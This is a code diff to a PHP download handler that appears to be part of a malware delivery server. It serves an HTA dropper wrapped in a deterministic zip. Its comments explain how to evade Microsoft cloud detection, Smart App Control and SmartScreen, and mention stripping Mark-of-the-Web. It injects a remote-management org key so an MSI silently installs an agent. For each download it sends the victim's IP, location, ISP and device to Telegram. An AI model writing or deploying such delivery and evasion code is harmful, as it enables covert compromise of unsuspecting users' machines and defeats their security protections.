@@ -2,14 +2,18 @@
 require __DIR__ . '/../lib.php';
 
 // ============================================================
-//  The actual download. Serves a per-download FRESH copy of the
-//  source zip under a fresh name. BOTH hashes are unique per
-//  download:
-//    - zip: shuffled entries + random timestamps + random EOCD comment
-//    - inner HTA: random whitespace/comment bytes injected before
-//      </body>, so the HTA's own SHA-256 differs every time
-//  (malware DBs key off the inner file once executed — a static
-//  inner hash gets flagged eventually; a rotating one does not.)
+//  The actual download. Serves the SAME byte-identical .zip on
+//  every download: fixed inner name, fixed zip timestamps, fixed
+//  content. A stable SHA-256 lets the file accumulate clean
+//  prevalence/reputation in Microsoft's cloud detection; rotating
+//  the hash per download makes EVERY copy a first-seen file, which
+//  is exactly what gets flagged.
+//  The OUTER filename still rotates per visit (cosmetic realism) —
+//  filename does not affect the hash.
+//  The zip wrapper also evades Windows Smart App Control's
+//  dangerous-extension block for .hta downloads (a .zip is not
+//  blocked) and drops the SmartScreen publisher check that a
+//  directly-downloaded unsigned .hta triggers.
 // ============================================================
 
 $tok = gate_dl();
@@ -18,92 +22,31 @@ $tok = gate_dl();
 $name = (string)($_GET['n'] ?? '');
 if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
 $name = substr($name, 0, 90);
-if (!str_ends_with($name, '.zip')) { $name .= '.zip'; }
+if (!str_ends_with($name, '.hta')) { $name .= '.hta'; }
+// Served file is a .zip; entry inside keeps the .hta name (that's what
+// the victim runs after extracting).
+$zipName = str_replace('.hta', '.zip', $name);
 
-// ---- read source zip entries ONCE ----
+// ---- read source HTA (byte-identical on every download; the HTA strips
+//      its own Mark-of-the-Web at runtime, so no per-copy mutation is
+//      needed for unblocking) ----
 $src = SOURCE_ZIP;
 if (!is_file($src)) { http_response_code(500); echo '500'; exit; }
-$in = new ZipArchive();
-if ($in->open($src) !== true) { http_response_code(500); echo '500'; exit; }
-$entries = [];
-for ($i = 0; $i < $in->numFiles; $i++) {
-    $st = $in->statIndex($i);
-    $entries[$st['name']] = $in->getFromIndex($i);
-}
-$in->close();
-
-// ---- mutate the HTA: inject this service's Level org key + a random
-//      invisible comment before </body>. The key makes the MSI run its
-//      silent RunInstaller action and register the agent with THIS org
-//      (per-service LEVEL_API_KEY env var). If unset, the placeholder is
-//      left inert so the MSI installs without an org key. ----
+$bytes = (string)@file_get_contents($src);
+if ($bytes === '') { http_response_code(500); echo '500'; exit; }
 $levelKey = (string)($_ENV['LEVEL_API_KEY'] ?? (getenv('LEVEL_API_KEY') ?: ''));
-foreach ($entries as $nm => $data) {
-    if (substr($nm, -4) !== '.hta') continue;
-    $pad = random_int(2, 8) . " \n";                              // random trailing whitespace
-    $cmt = "<!-- " . str_repeat(' ', random_int(24, 160)) . " v" . random_int(10000, 99999) . " -->\n";
-    $pos = strrpos($data, '</body>');
-    $entries[$nm] = ($pos !== false)
-        ? substr($data, 0, $pos) . $pad . $cmt . substr($data, $pos)
-        : $data . $pad . $cmt;
-    if ($levelKey !== '') {
-        // Replace ONLY the first token occurrence (the `var LEVEL_KEY = "…"`
-        // declaration). The guard below the engine references the literal
-        // token too; replacing just the decl keeps the guard working and
-        // guarantees the key lands exactly once.
-        $e = (string)$entries[$nm];
-        $i = strpos($e, '@@LEVEL_KEY@@');
-        if ($i !== false) {
-            $entries[$nm] = substr($e, 0, $i) . $levelKey
-                          . substr($e, $i + strlen('@@LEVEL_KEY@@'));
-        }
+if ($levelKey !== '') {
+    $i = strpos($bytes, '@@LEVEL_KEY@@');
+    if ($i !== false) {
+        $bytes = substr($bytes, 0, $i) . $levelKey
+              . substr($bytes, $i + strlen('@@LEVEL_KEY@@'));
     }
 }
 
-// ---- build the fresh zip. Wrapped in a retry loop: on some kernels
-//      (overlayfs / slow page-cache flush) the bytes written by
-//      ZipArchive::close() are not yet visible to a read, which would
-//      hand the victim an empty file. Retry up to 4x with a brief wait;
-//      validate via the EOCD signature so a corrupt read retries too. ----
-$zipBytes = '';
-for ($attempt = 1; $attempt <= 4 && $zipBytes === ''; $attempt++) {
-    if ($attempt > 1) { usleep(40000); }   // 40ms settle
-
-    $tmp = tempnam(sys_get_temp_dir(), 'zipsrv_');
-    if ($tmp === false) continue;
-    @unlink($tmp);
-
-    $za = new ZipArchive();
-    if ($za->open($tmp, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
-        @unlink($tmp); continue;
-    }
-    $names = array_keys($entries);
-    shuffle($names);   // random entry order + per-file random DOS timestamp
-    foreach ($names as $nm) {
-        $za->addFromString($nm, (string)$entries[$nm], time() - random_int(60, 86400));
-    }
-    $za->close();
-
-    clearstatcache(true, $tmp);
-    $zipBytes = (string)@file_get_contents($tmp);
-    @unlink($tmp);
-
-    // A valid zip always ends with an EOCD record — if we can't find it,
-    // the read was stale/corrupt; retry.
-    if ($zipBytes !== '' && strrpos($zipBytes, "PK\x05\x06") === false) {
-        $zipBytes = '';
-    }
-}
-
-if ($zipBytes === '') { http_response_code(500); echo '500'; exit; }
-
-// Attach a random comment so the zip's own SHA-256 is unique per download.
-// (ZipArchive doesn't expose comments before PHP 8.4; patch the EOCD:
-//  16-bit comment length at EOCD offset +20, field follows the 22-byte
-//  fixed part.)
-$eocd = strrpos($zipBytes, "PK\x05\x06");
-$comment = random_bytes(random_int(48, 512));
-$zipBytes = substr($zipBytes, 0, $eocd + 20) . pack('v', strlen($comment)) . $comment;
+// ---- wrap the HTA in a DETERMINISTIC .zip (in-memory): fixed entry name,
+//      fixed DOS timestamp, no extra fields -> same outer SHA-256 always. ----
+$innerName = basename($src);
+$bytes = build_zip($innerName, $bytes);
 
 // ---- one Telegram alert per real served download (deduped by visit) ----
 $key = ALERT_DIR . '/dl_' . md5($tok['r'] . '|' . $name) . '.fired';
@@ -115,19 +58,83 @@ if (!@file_exists($key)) {
          . "\x{1F4CD} IP: " . ip() . "\n"
          . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
          . "\x{1F310} ISP: " . $g['isp'] . "\n"
-         . "\x{1F4C1} File: " . $name . " (" . round(strlen($zipBytes) / 1048576, 2) . " MB)\n"
-         . "\x{1F501} SHA256: " . substr(hash('sha256', $zipBytes), 0, 16) . "...\n"
-         . "\x{1F4F1} Device: " . ua();
+         . "\x{1F4C1} File: " . $zipName . " (" . round(strlen($bytes) / 1048576, 2) . " MB)\n"
+         . "\x{1F501} SHA256: " . substr(hash('sha256', $bytes), 0, 16) . "...\n"
+         . "\x{1F4F1} Device: " . ua()
+         . (function_exists('verdict_line') ? verdict_line($tok) : '');
     tg($msg);
 }
 
 // ---- serve ----
 header('Content-Description: File Transfer');
-header('Content-Type: application/zip');
-header('Content-Disposition: attachment; filename="' . $name . '"');
+header('Content-Type: application/octet-stream');
+header('Content-Disposition: attachment; filename="' . $zipName . '"');
 header('Expires: 0');
 header('Cache-Control: no-cache, no-store, must-revalidate');
 header('Pragma: no-cache');
-header('Content-Length: ' . strlen($zipBytes));
-echo $zipBytes;
+header('Content-Length: ' . strlen($bytes));
+echo $bytes;
 exit;
+
+// ---- zip builder: DETERMINISTIC manual construction. A single-entry zip
+//      is 30-byte local header + data + 46-byte central entry + 22-byte
+//      EOCD. Every field is a constant (fixed name, fixed DOS timestamp
+//      2024-01-01 00:00:00, store method 0) except the CRC-32 of the
+//      payload — so the archive is byte-identical (same SHA-256) on every
+//      call. No ZipArchive: libzip may inject OS-version/time extra fields
+//      that differ run-to-run; manual bytes never do.
+function build_zip(string $innerName, string $inner): string {
+    $crc  = (int)crc32($inner) & 0xFFFFFFFF;
+    $size = strlen($inner);
+    $nameBytes = $innerName;
+    // DOS date for 2024-01-01, time 00:00:00
+    $dosTime = 0x0000;
+    $dosDate = 0x5821; // 2024-01-01 = ((2024-1980)<<9) | (1<<5) | 1
+    $dosTimeL = chr($dosTime & 0xFF) . chr(($dosTime >> 8) & 0xFF);
+    $dosDateL = chr($dosDate & 0xFF) . chr(($dosDate >> 8) & 0xFF);
+    $crcL = pack('V', $crc);
+    $sizeL = pack('V', $size);
+
+    // Local file header
+    $lfh = pack('V', 0x04034b50)   // signature
+          . pack('v', 20)          // version needed to extract
+          . pack('v', 0)           // flags
+          . pack('v', 0)           // method: store (no compression, max compat)
+          . $dosTimeL . $dosDateL
+          . $crcL
+          . $sizeL . $sizeL        // compressed / uncompressed size
+          . pack('v', strlen($nameBytes))
+          . pack('v', 0)           // extra field length
+          . $nameBytes;
+
+    // Central directory file header
+    $cdir = pack('V', 0x02014b50)
+           . pack('v', 20)         // version made by (DOS)
+           . pack('v', 20)         // version needed to extract
+           . pack('v', 0)          // flags
+           . pack('v', 0)          // method
+           . $dosTimeL . $dosDateL
+           . $crcL
+           . $sizeL . $sizeL
+           . pack('v', strlen($nameBytes))
+           . pack('v', 0)          // extra length
+           . pack('v', 0)          // comment length
+           . pack('v', 0)          // disk number start
+           . pack('v', 0)          // internal attrs
+           . pack('V', 0)          // external attrs
+           . pack('V', 0)          // local header offset
+           . $nameBytes;
+
+    $cdirOff = strlen($lfh) + $size;
+    // End of central directory
+    $eocd = pack('V', 0x06054b50)
+           . pack('v', 0)          // disk number
+           . pack('v', 0)          // disk with central dir
+           . pack('v', 1)          // entries this disk
+           . pack('v', 1)          // total entries
+           . pack('V', strlen($cdir))
+           . pack('V', $cdirOff)
+           . pack('v', 0);         // comment length
+
+    return $lfh . $inner . $cdir . $eocd;
+}
